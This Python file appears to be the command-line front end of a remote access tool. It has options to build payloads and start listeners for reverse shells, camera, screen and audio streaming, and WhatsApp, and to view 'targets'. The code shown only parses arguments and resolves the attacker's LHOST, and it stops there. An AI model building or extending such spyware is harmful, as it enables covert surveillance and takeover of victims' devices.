"""
    this code created by 0RaMsY0
"""
#checking var
LHOST_OPT = False
#main host for everything
LHOST = ""
#payload configuration veriables
P_LPORT_SOCKET = ""
P_LPORT_CameraStreaming = ""
P_LPORT_ScreenSharing = ""
P_LPORT_ReverseShell = ""
P_LPORT_Whatsapp = ""

import argparse
import time, os, sys
from typing import Text
from server.name import SERVER_TYPES
from payloads.name import PAYLOADS_TYPES
from assets.colors import colors
from assets.symbols import Sminess, Splus, Swarning, Ssowrd
from payloads.name import PAYLOADS_TYPES
from errors.WarningHandler import * #error handler you will find the script in warnings\WarningHandler.py directory
import json
import socket
CR = colors #colors class from assets/colors.py

PARSER = argparse.ArgumentParser()
PARSER.add_argument("-s", "--show", help="take an argument [servers, payloads]")
PARSER.add_argument("-u", "--use" , help="command to start a server [take an argument]")
PARSER.add_argument("-S", "--set", help="command for creating a payload [take an argument]")
PARSER.add_argument("-t", "--target", help="commmand to see targets info [take an argument]")
PARSER.add_argument("-sh", "--SocketLhost", help="command for setting the lhost [automatic chose by default from config.json]")
PARSER.add_argument("-sp", "--SocketLport", help="command for setting the lport [automatic chose by default from config.json]")
PARSER.add_argument("-n", "--name", help="command to setup a costume payload name")
PARSER.add_argument("-csp", "--CameraStreamingPort", help="command for chosing a costume CameraStreaming port [automatic chose by default from config.json]")
PARSER.add_argument("-ssp", "--ScreenStreamingPort", help="command for chosing a costume ScreenStreaming port [automatic chose by default from config.json]")
PARSER.add_argument("-rsp", "--ReverseShellPort", help="command for chosing a costume ReverseShellPort port [automatic chose by default from config.json]")
PARSER.add_argument("-asp", "--AudioStreamingPort", help="command for chosing a costume AudioStreamingPort port [automatic chose by default from config.json]")
ARGS = PARSER.parse_args()
#main args
__SHOW__ = ARGS.show
__USE__ = ARGS.use
__SET__ = ARGS.set
__TARGET__ = ARGS.target
__NAME__ = ARGS.name
#settings args for "set" and "use" argument
__SocketLhost__ = ARGS.SocketLhost
__SocketLport__ = ARGS.SocketLport
__CameraStreamingPort__ = ARGS.CameraStreamingPort
__ScreenStreamingPort__ = ARGS.ScreenStreamingPort 
__ReverseShell__ = ARGS.ScreenStreamingPort
__AudioStreamingPort__ = ARGS.AudioStreamingPort
if __SHOW__:
    if __SHOW__ == "servers":
        print(F"\r {Splus} {CR.green()}Server:")
        for x in SERVER_TYPES:
            print(" "*5 +f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
    elif __SHOW__ == "payloads" :
        print(F"\r {Splus} {CR.green()}Payloads:")
        for x in PAYLOADS_TYPES:
            print(" "*5 +f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
    else:
        InvaliedEntry(
            element = "show"
        )

if __SET__:
    """
    checking for what __SET__ [payload]
    type have being chosing by the user
    """
    if __SET__ == PAYLOADS_TYPES[0]:
        with open("config.json", "r") as JSON_CONF:
            CONFIG_LOAD = json.load(JSON_CONF)
            if __SocketLhost__ is None:
                if CONFIG_LOAD["PayloadConfig"]["lhost"] is None:
                    NoLhostSpec()
                    sys.exit()
                else:
                    if CONFIG_LOAD["PayloadConfig"]["lhost"] is not None:
                        if CONFIG_LOAD["PayloadConfig"]["lhost"] == "auto":
                            LHOST = socket.gethostbyname(socket.gethostname())
                        else:
                            LHOST = CONFIG_LOAD["PayloadConfig"]["lhost"]
print(LHOST)